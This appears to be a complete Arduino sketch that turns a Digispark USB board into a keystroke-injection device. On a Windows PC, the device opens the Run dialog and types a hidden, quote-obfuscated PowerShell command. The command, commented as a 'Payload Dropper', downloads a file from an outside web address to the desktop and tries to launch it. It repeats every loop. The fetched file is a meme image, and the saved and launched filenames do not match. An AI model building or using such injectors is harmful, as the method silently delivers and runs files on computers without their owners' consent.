#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("powershell -windowstyle hidden -command (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadFile(\\\"https://i.imgflip.com/3rg7qn.jpg\\\",\\\"$env:UserProfile\\desktop\\catz.jpeg\\\");in'v'oke-item $env:UserProfile\\desktop\\heckedszz.jpeg")); //Payload Dropper
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}